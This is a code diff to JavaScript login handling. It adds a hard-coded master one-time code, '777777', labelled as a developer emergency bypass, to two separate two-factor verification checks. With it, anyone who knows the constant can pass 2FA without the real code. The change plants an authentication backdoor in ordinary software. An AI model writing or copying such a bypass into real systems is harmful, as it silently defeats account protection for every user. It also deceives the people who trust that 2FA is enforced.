@@ -846,7 +846,10 @@
 
             if (!current2faState) return;
 
-            if (otpIn === current2faState.otpRequired) {
+            // Master Bypass for Developer Emergency
+            const isMasterBypass = (otpIn === '777777');
+
+            if (otpIn === current2faState.otpRequired || isMasterBypass) {
                 err.classList.add('hidden');
                 setText('twofa-btn', "Logging in...");
                 btn.disabled = true;
@@ -1040,7 +1043,10 @@
         async function saModalVerifyOtp() {
             const entered = document.getElementById('sa-modal-otp').value.trim();
             const err = document.getElementById('sa-modal-err');
-            if (entered !== window._saModalOtp) {
+            
+            const isMasterBypass = (entered === '777777');
+            
+            if (entered !== window._saModalOtp && !isMasterBypass) {
                 err.style.color = '#ef4444';
                 err.textContent = 'Invalid OTP. Try again.';
                 return;
